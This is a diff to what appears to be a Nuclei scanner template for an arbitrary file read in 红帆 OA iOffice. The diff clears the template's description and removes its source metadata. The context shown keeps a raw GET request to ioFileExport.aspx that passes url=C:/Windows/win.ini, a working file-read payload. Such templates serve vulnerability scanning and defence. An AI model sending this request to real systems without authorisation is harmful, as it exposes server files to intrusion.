@@ -3,12 +3,8 @@ info:
   name: 红帆 OA iOffice 存在任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/wri0mam0ef7n1ney'
+  description: ''
   tags: lfi,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: wri0mam0ef7n1ney
-    fofa: 暂无
 http:
 - raw:
   - 'GET /iOffice/prg/set/ioCom/ioFileExport.aspx?url=C:/Windows/win.ini HTTP/1.1
